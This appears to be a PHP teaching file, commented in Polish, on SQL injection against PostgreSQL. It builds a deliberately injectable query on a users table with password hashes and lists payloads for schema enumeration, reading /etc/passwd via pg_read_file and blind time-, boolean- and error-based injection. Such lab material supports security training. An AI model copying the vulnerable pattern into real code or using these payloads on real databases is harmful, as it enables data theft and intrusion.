<?php
// Zaawansowane SQL Injection w PostgreSQL
header("Content-Type: application/json");

$search = $_GET["search"] ?? "";

// Podatne zapytanie z LIKE i funkcjami PostgreSQL
// PostgreSQL-specific functions:
// - version() - wersja bazy danych
// - current_user - aktualny użytkownik
// - current_database() - nazwa bazy danych
// - pg_read_file() - odczyt plików (wymaga superuser)
// - COPY ... TO PROGRAM - wykonanie komend (wymaga superuser)

$sql = "SELECT id, email, password_hash FROM users WHERE email LIKE '%" . $search . "%'";

// PostgreSQL-specific injection payloads:
$payloads = [
    "version" => "test' UNION SELECT NULL, version(), NULL--",
    "current_user" => "test' UNION SELECT NULL, current_user, NULL--",
    "current_database" => "test' UNION SELECT NULL, current_database(), NULL--",
    "tables" => "test' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema='public'--",
    "columns" => "test' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
    "pg_read_file" => "test' UNION SELECT NULL, pg_read_file('/etc/passwd'), NULL--",
    "time_based" => "test' AND (SELECT pg_sleep(5))--",
    "boolean_based" => "test' AND 1=CAST((SELECT version()) AS int)--",
    "error_based" => "test' AND 1=CAST((SELECT 1/0) AS int)--"
];

echo json_encode([
    "query" => $sql,
    "database" => "PostgreSQL",
    "vulnerable" => true,
    "postgresql_specific_payloads" => $payloads,
    "functions" => [
        "version() - database version",
        "current_user - current database user",
        "current_database() - database name",
        "pg_read_file() - read files (requires superuser)",
        "pg_sleep() - time-based blind SQLi",
        "information_schema.tables - list tables",
        "information_schema.columns - list columns"
    ],
    "note" => "PostgreSQL has powerful functions that can be exploited if SQL injection exists"
]);

